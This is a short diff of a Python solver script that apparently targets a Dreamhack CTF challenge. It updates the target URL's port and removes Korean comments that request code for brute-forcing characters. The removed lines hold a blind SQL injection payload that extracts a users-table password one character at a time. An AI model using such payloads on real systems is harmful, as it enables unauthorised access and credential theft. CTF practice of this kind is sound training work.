@@ -1,8 +1,8 @@
 import requests
 import string
 
-# 대상 URL
-url = "http://host3.dreamhack.games:10970/search"
+# 대상 URL (바뀔 수 있음)
+url = "http://host3.dreamhack.games:9528/search"
 
 # 무작위 대조를 위한 문자셋 (숫자 + 알파벳 소문자 + 대문자)
 char_set = string.digits + string.ascii_letters + "_{}" 
@@ -35,15 +35,6 @@ def solve():
 
 if __name__ == "__main__":
     solve()
-
-
-# http://host3.dreamhack.games:10970/search 이 주소의 입력칸인 query에 
-# %' AND (SELECT SUBSTR(password,1,1) FROM users) = 'ch'--
-# 위 명령어의 ch를 a~z까지 바꿔서 보내는 파이썬 코드를 작성해줘
-
-
-
-# %' AND (SELECT SUBSTR(password,1,1) FROM users) = 'a'--
 
 
 
